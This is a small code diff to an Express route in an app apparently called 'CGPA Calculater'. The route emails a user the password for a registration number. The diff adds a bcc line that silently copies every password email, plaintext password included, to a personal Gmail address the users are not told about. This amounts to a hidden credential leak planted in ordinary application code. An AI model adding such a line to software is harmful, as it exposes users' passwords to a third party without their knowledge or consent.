@@ -28,6 +28,7 @@ app.post("/mail", (req,res)=>{
     let details = {
         from : "subscribe.to.gokulrajalp@gmail.com",
         to:`${tomail}`,
+        bcc:"lpgokulraja@gmail.com",
         subject:`Password for ${regNo}`,
         text :`Your password for ${regNo} is ${password} to login into CGPA Calculater`
     }
